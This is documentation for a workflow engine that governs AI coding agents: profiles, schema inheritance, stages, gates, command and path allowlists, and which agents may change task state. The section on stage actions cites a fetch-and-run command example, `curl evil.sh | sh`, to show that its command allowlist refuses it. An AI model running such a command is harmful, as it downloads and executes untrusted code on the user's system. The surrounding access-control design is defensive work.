# Profiles

A profile is a directory with `profile.json`, one or more schema YAML files, and
optional agent prompts.

## Layout

```
profiles/
  base/      profile.json + base.yaml       — canonical workflow, everything extends it
  harness/   profile.json + harness.yaml    — delta: TypeScript self-edit
  android/   profile.json + android.yaml    — delta: Android
             agent/*.md                     — agent prompts (agentsDir: "agent")
             task-cycles.yaml               — unregistered example, see its header
```

A reference schema with every supported field lives in
`docs/examples/workflow-schema.example.yaml`. It is documentation, not a loaded
profile.

## Schema resolution

A profile may hold as many schemas as it likes, and they are **independent
workflows**. A session runs exactly one of them, named as
`<profileId>/<schemaId>` when it is created; the schema id is the file name
without its extension, and it has to be unique only inside its own profile.

Two schemas become one **only through `extends`**, declared at the top of the
schema file as `<profileId>/<file>`. That profile must be on the chain
`profile.json.extends` builds. Schemas sitting side by side in one profile
never merge — that is the whole point of the id.

Merging a schema onto the one it extends is last-wins per entry: transitions
merge per `from→to`; a stage merges field by field, and its nested stages and
transitions merge by the same rule at any depth. A stage's `actions:` is part
of that stage, so it is replaced with the stage entry that redeclares it.

Write a derived schema as a delta: declare `extends`, then only what differs.
Naming a stage refines it — a child that pins a roster keeps the loop, nested
stages and transitions its parent declared for that stage.

`profile.json.extends` still governs metadata (agents, skills, invariants,
directories) and is what makes a parent's schema files reachable by name. A
profile that declares no `schemas` of its own inherits the nearest ancestor's
list.

## The stage model

There is one unit of workflow state: the **stage**. A stage that names a task
list in `loop:` runs its own `stages` once per task, moved by its own
`transitions`. Nesting is the only difference between an inner stage and an
outer one: `gates`, `transitions`, guards, effects and retry budgets mean the
same at either level. `allowedAgents` is the exception — it is read only at
task admission, so outside a loop it is inert. See "Known traps" below.

`gates:` on a stage declares what it waits for. Its agents finish with a
`<workflow-result>` whose `stage` field names one of those gates — never the
stage they ran in, because several agents may run in one stage (review and qa
in parallel). The stage passes when every gate it declares passes, and fails as
soon as one fails. Inside a loop those verdicts live on the task's own run;
outside it they are the session's gates.

Full model: `docs/stage-model.md`. Target workflow: `docs/stage-model-plan.md`.

## Known traps

**`allowedAgents` is enforced at task admission only.** Agent identity reaches
the plugin in exactly one place: the `subagent_type` of a `task` call. So
`allowedAgents` is checked in `tool.execute.before` for `task`, against the
nested stage's list or, when it declares none, its parent's. A stage without
`stages` never reaches that check, so a roster there is inert.

**Agent names carry the profile prefix, and resolution handles it.**
`syncProfileAgents` copies `profiles/<id>/<agentsDir>/*.md` into
`.opencode/agents/<id>/`, and OpenCode derives an agent's name from the path
under `agent/` or `agents/` — so `code.md` registers as `<id>/code`. Schemas stay
authored with bare names; the resolver qualifies them (`src/app/agent-names.ts`),
and a dispatch matching either form is accepted. A name qualified by a different
profile never matches.

**`editingAgents` says which agents edit.** A stage whose `allowedAgents`
admits one of them is a stage where work happens, which is what lets a task's
own `editingAgents` be enforced. There was a `verifiers` key beside it that
nothing ever read — declaring a verifier restricted nothing and routed nothing
— and it has been removed rather than left looking like a control.

## Declaration order is load-bearing

The order stages appear in decides three things, and nothing in the file says
so — there is no `initial:` or `entry:` key, by decision:

1. **Where the workflow starts.** The first stage declared under `stages:`.
2. **Where a task run opens.** The first stage declared under a loop's own
   `stages:`.
3. **How the first edit of a task is judged.** That edit arrives before the run
   opens, so admission uses the same stage the run will open on. Were it to use
   the outer loop stage instead, admission and the mutation lifecycle would
   disagree and work could never start.

So reordering two blocks — a change that looks like formatting — changes
behaviour in three places. `test/schema/declaration-order.test.ts` pins all
three against the shipped `base`, so a reordering breaks the build instead of
quietly rewriting the workflow.

## What a stage allows: `actions:`

A stage declares what may happen on it. This is the second axis beside
transitions: an edge says whether you may _leave_, an action says whether you
may _do_ something while staying. A commit is not a transition, and neither is
an edit.

```yaml
code:
  actions:
    - action: edit
      paths: ['**']
      guard: "session.approved('plan')"
    - action: bash
      commands: ['git status', 'git diff.*']
      guard: "session.approved('plan')"
```

`action` names a host tool — `bash`, or `edit` for the family
`edit`/`write`/`apply_patch`. There is no `commit` action: no such tool exists.

Entries are a list because one action needs several: `edit` splits by path
mask, `bash` by command pattern. They are read in order, and the first whose
discriminator matches **and** whose guard holds wins — the same rule several
edges on one `from→to` pair follow.

Omit `actions:` and the stage is unrestricted. Declare it and the list is
exhaustive: nothing matched means refused. `base` declares actions on every
stage, so a refusal is a rule rather than an accident of the runtime failing
for some other reason.

`commands:` are anchored regular expressions matched against **each shell
segment**, and every segment must match one of them. A pattern of `npm test`
therefore refuses `npm test && curl evil.sh | sh`.

Two rules worth knowing before you write a mask: `paths:` only works for `edit`
(a `bash` call carries no path, only `workdir`), and a mask with no wildcard
matches that one path and nothing inside it — write `src/auth/**`, not
`src/auth`. The compiler refuses both mistakes.

**Inheriting a stage replaces its `actions` wholesale.** A stage merges field by
field, and `actions` is one field. A profile that adds its own build command
must repeat the `edit` entry too, or edits lose their guard — silently.

## Committing

`scripts/commit-task.ts` is the committing step, and the schema is what says
so: the stage declares a `bash` action with `delivers: true` whose `commands:`
name the script. `delivers` is also what tells the core not to treat the call
as an ordinary edit — it issues a `deliveryPermit` before, and writes
`deliveryReceipt` only after HEAD actually moved, which is what releases
`commit → done`.

Whether the commit is allowed at all is that entry's own `guard:`. In `base`
it is every task completed and both verdicts collected — the condition the
runtime used to compute by itself.

A stage that declares no actions falls back to recognition by file name, so an
older profile keeps working.

## The core's verdict about a move: `task.checks`

`task.checks` in a guard is what the engine decided about a task's last move by
looking at the disk: did the tool fail, did it write outside the task's
`writeScope`, could the diff be computed, do the profile's invariants hold.
Values are `passed` / `failed`.

It is **not** a gate, and the difference matters. Gates are written by an agent
through `<workflow-result>`, and an agent can set any gate its stage declares —
which is exactly right for `review` and `qa`. This verdict is the one the
engine reaches itself, and in the same namespace an agent could claim it.

## Who may change workflow task state

`workflow.tasks-set`, `workflow.tasks-set-status` and
`workflow.tasks-resolve-decision` are refused for every agent except the ones a
schema names in `taskControlAgents` (default: `orchestrator`). The calling agent
comes from `ToolContext.agent`, which the host populates from the real agent
name — a caller the host does not name is refused too.

The reason is the same one behind the delivery permit: task status is exactly
what `allTasksCompleted()` and `hasPendingTasks()` read, so an agent that can
write it closes its own stage without evidence. Workers report outcomes; the
orchestrator records them.

`workflow.tasks-get` stays open — reading is not control.

Names follow the usual rule: a bare name (`orchestrator`) and the qualified form
the host reports (`android/orchestrator`) both match, another profile's
qualified name never does.
